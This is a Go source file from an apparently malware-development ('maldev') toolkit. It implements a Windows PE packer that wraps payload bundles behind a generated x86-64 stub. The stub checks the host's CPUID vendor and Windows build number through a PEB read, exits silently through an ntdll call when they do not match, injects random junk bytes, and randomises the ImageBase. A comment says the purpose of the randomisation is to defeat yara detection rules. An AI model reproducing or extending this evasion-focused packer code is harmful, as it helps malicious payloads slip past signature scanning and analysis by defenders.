package packer

import (
	"encoding/binary"
	"fmt"
	"sync"

	"github.com/oioio-space/maldev/pe/packer/stubgen/amd64"
	"github.com/oioio-space/maldev/pe/packer/stubgen/stage1"
	"github.com/oioio-space/maldev/pe/packer/transform"
	"github.com/oioio-space/maldev/random"
)

// exitProcessBlockCache caches the §2 EmitNtdllRtlExitUserProcess(0)
// bytes — the block is deterministic (no varying input) and gets
// embedded into every Windows wrap. /simplify-pass 2026-05-10 flagged
// the per-wrap re-assembly (143-byte primitive emitted via 143
// individual ABYTE progs) as the dominant cost on the wrap hot path.
var (
	exitProcessBlockOnce  sync.Once
	exitProcessBlockBytes []byte
	exitProcessBlockErr   error
)

func cachedExitProcessBlock() ([]byte, error) {
	exitProcessBlockOnce.Do(func() {
		b, err := amd64.New()
		if err != nil {
			exitProcessBlockErr = fmt.Errorf("packer: amd64 builder: %w", err)
			return
		}
		if err := stage1.EmitNtdllRtlExitUserProcess(b, 0); err != nil {
			exitProcessBlockErr = fmt.Errorf("packer: emit ExitProcess: %w", err)
			return
		}
		exitProcessBlockBytes, exitProcessBlockErr = b.Encode()
		if exitProcessBlockErr != nil {
			exitProcessBlockErr = fmt.Errorf("packer: encode ExitProcess: %w", exitProcessBlockErr)
		}
	})
	return exitProcessBlockBytes, exitProcessBlockErr
}

// WrapBundleAsExecutableWindows composes a runnable Windows x86-64
// PE32+ from a bundle blob. Windows symmetry of
// [WrapBundleAsExecutableLinux].
//
// Uses the V2NW Builder-driven scan stub
// ([bundleStubV2NegateWinBuildWindows], v0.88.0+) — honours
// PT_MATCH_ALL, PT_CPUID_VENDOR, PT_WIN_BUILD (via PEB.OSBuildNumber
// read), PT_CPUID_FEATURES, and the FingerprintPredicate.Negate
// flag. On no match, calls ntdll!RtlExitUserProcess(0) via the §2
// PEB-walk primitive — silent clean exit, equivalent to
// BundleFallbackExit.
func WrapBundleAsExecutableWindows(bundle []byte) ([]byte, error) {
	return WrapBundleAsExecutableWindowsWith(bundle, BundleProfile{})
}

// WrapBundleAsExecutableWindowsWith is the per-build-profile-aware
// variant. Validates the bundle's magic against profile.Magic
// (canonical default when zero) before wrapping.
//
// Per-build ImageBase derivation from profile.Vaddr is queued for
// PHASE B — today the canonical [transform.MinimalPE32PlusImageBase]
// (0x140000000) is used regardless of profile contents.
func WrapBundleAsExecutableWindowsWith(bundle []byte, profile BundleProfile) ([]byte, error) {
	seed, err := random.Int64()
	if err != nil {
		return nil, fmt.Errorf("packer: stub junk seed: %w", err)
	}
	return WrapBundleAsExecutableWindowsWithSeed(bundle, profile, seed)
}

// WrapBundleAsExecutableWindowsWithSeed is the deterministic variant.
// Same seed → same stub junk pattern → byte-identical wrapped output
// (modulo the random per-payload XOR keys from the upstream bundle
// pack). Use seed=0 for the canonical junk-free shape.
func WrapBundleAsExecutableWindowsWithSeed(bundle []byte, profile BundleProfile, seed int64) ([]byte, error) {
	if len(bundle) < BundleHeaderSize {
		return nil, fmt.Errorf("%w: %d < BundleHeaderSize %d",
			ErrBundleTruncated, len(bundle), BundleHeaderSize)
	}
	expected := resolvedMagic(profile)
	if magic := binary.LittleEndian.Uint32(bundle[0:4]); magic != expected {
		return nil, fmt.Errorf("%w: %#x != %#x",
			ErrBundleBadMagic, magic, expected)
	}

	// V2NW Builder-driven scan stub (v0.88.0+): adds §5 negate flag
	// + §4-PHASE-B-2 PT_WIN_BUILD support to the Windows wrap.
	// EmitPEBBuildRead loads OSBuildNumber into R13 at prologue exit;
	// per-entry test honors PT_CPUID_VENDOR, PT_WIN_BUILD range
	// check, and the negate flag XOR. On no-match, jumps to the §2
	// EmitNtdllRtlExitUserProcess(0) block embedded inline.
	bRng, aRng := splitSeedRngs(seed)
	stub, _, err := bundleStubV2NegateWinBuildWindowsRng(bRng)
	if err != nil {
		return nil, err
	}
	if aRng != nil {
		stub = injectStubJunk(stub, aRng)
	}
	bundleOff := uint32(len(stub)) - 5 // distance from .pic label
	binary.LittleEndian.PutUint32(stub[bundleOffsetImm32Pos:], bundleOff)

	combined := make([]byte, 0, len(stub)+len(bundle))
	combined = append(combined, stub...)
	combined = append(combined, bundle...)

	imageBase := windowsImageBaseFromProfile(profile)
	return transform.BuildMinimalPE32PlusWithBase(combined, imageBase)
}

// windowsImageBaseFromProfile derives a Windows-suitable ImageBase
// from the bundle profile's Vaddr field (set by [DeriveBundleProfile]
// to randomise per-build IOCs).
//
// PE32+ ImageBase has stricter alignment than ELF PT_LOAD vaddr:
// Windows requires 64K alignment whereas Linux is content with 4K
// page alignment. profile.Vaddr is page-aligned by HKDF + masking
// in DeriveBundleProfile; for Windows we additionally zero the low
// 16 bits.
//
// Returns the canonical ImageBase when:
//   - profile is the zero value (Vaddr == 0; canonical default), or
//   - the masked Vaddr falls below 64K (after low-bits zeroing the
//     value is too low to be a legal user-space ImageBase).
//
// The derivation loses ~4 bits of randomness vs the Linux ELF use
// (12 bits → 16 bits cleared) but the remaining ~36 bits of entropy
// in [0x10000..0x7fff_ffff_ffff_0000] are far more than enough to
// defeat 'tiny PE at canonical 0x140000000' yara rules.
func windowsImageBaseFromProfile(profile BundleProfile) uint64 {
	if profile.Vaddr == 0 {
		return transform.MinimalPE32PlusImageBase
	}
	const peAlignmentMask uint64 = ^uint64(0xffff)
	candidate := profile.Vaddr & peAlignmentMask
	if candidate < 0x10000 {
		return transform.MinimalPE32PlusImageBase
	}
	return candidate
}
